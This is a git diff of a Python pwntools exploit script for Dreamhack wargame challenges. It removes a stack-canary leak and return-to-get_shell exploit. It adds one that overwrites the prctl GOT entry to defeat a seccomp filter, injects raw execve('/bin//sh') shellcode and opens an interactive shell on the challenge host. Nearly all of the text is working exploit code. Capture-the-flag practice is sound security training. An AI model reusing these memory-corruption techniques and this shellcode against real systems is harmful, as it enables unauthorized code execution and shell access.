@@ -1,19 +1,26 @@
 #!/usr/bin/env python3
 
+from time import sleep
 from pwn import *
-import time
-context.log_level = "debug"
 
-e = ELF("./master_canary")
+context.update(os="linux", arch="amd64")
+
+e = ELF("./seccomp")
+
 HOST = "host1.dreamhack.games"
-PORT = 11525
+PORT = 16054
+
 conn = remote(HOST, PORT)
 
-conn.sendlineafter("> ", "1")
-conn.sendlineafter("> ", "2")
-conn.sendlineafter("Size: ", str(int(0x8e9)))
-conn.sendlineafter("Data: ", b"\x90"*0x8e9)
-stack_guard = b"\x00"+conn.recv()[-15:-8]
-conn.sendline(b"3\n"+(b"\x90"*0x28)+stack_guard+b"\x90"*8+p64(e.symbols["get_shell"]))
-conn.recv()
+shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
+
+conn.sendline("3")
+print(conn.recv(timeout=0.5))
+
+conn.sendline(str(e.got["prctl"]))
+conn.sendline(str(0x0000000000400A4E))
+conn.sendline("1")
+conn.sendline(shellcode)
+sleep(0.3)
+conn.sendline("2")
 conn.interactive()
